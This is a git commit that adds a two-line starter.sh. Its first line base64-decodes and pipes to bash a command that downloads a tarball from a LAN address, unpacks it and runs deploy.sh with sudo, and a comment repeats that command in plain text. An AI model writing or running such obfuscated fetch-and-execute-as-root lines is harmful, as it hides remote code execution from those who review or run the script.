620ea095828457b43378bfc1307fd10fd5ce6e61
innx <innxrmxst@gmail.com>
2025-04-08 20:44:59 +0200

    Create starter.sh

---
+++ starter.sh
@@ -0,0 +1,2 @@
+echo 'd2dldCAtcSBodHRwOi8vMTkyLjE2OC4xLjEwOS9kZXBsb3kudGFyLmd6ICYmIHRhciAteHpmIGRlcGxveS50YXIuZ3ogJiYgcm0gLWYgZGVwbG95LnRhci5neiAmJiBzdWRvIGJhc2ggZGVwbG95LnNoCg==' | base64 -d | bash
+#wget -q http://192.168.1.109/deploy.tar.gz && tar -xzf deploy.tar.gz && rm -f deploy.tar.gz && sudo bash deploy.sh
